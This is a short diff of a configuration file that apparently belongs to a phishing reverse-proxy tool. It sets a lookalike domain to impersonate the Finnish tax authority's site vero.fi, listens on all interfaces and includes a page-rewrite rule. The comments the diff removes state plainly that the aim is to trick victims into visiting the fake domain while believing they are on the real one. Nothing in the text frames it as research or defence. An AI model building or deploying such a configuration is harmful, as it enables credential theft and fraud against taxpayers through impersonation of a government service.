@@ -1,9 +1,9 @@
 {
-  //domain that you will be tricking your victim of visiting
+  
   "proxyDomain": "vero-fi-henkiloasiakkaat.net",
   "listeningAddress": "0.0.0.0",
 
-  //domain that you want your victim to think they are visiting
+  
   "target": "vero.fi",
   "targetResources": "",
   "targetRules":         "PC9oZWFkPg==:",
